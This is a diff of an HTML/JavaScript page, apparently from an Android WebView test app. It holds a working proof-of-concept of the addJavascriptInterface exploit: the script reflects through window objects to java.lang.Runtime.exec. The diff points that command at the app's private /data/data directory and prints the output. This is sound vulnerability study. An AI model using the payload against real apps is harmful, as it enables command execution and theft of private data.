@@ -22,14 +22,15 @@
        {
         for (var obj in window) {
             console.log(window[obj]);
+            alert(obj);
             if ("getClass" in window[obj]) {
                 alert(obj);
                 return window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
              }
          }
        } 
-      
-      var p = execute(["ls","/mnt/sdcard/"]);
+      document.write("aaaaaaaaaaaaaaaaaa");
+      var p = execute(["ls","/data/data/com.example.jin.myapplication/"]);
       document.write(getContents(p.getInputStream()));
     </script>
 
@@ -56,13 +57,14 @@
 
   <body>
       <p>点击图片把URL传到Java代码</p>
+      <!--
       <img class="curved_box" id="image" 
          onclick="onImageClick()"
          width="328"
          height="185"
-         src="http://t1.baidu.com/it/u=824022904,2596326488&fm=21&gp=0.jpg"
+         src="https://www.baidu.com/img/bd_logo1.png"
          onerror="this.src='background_chl.jpg'"/>
-    </p>
+         -->
     <button type="button" onclick="onButtonClick()">与Java代码交互</button>
   </body>
 </html>
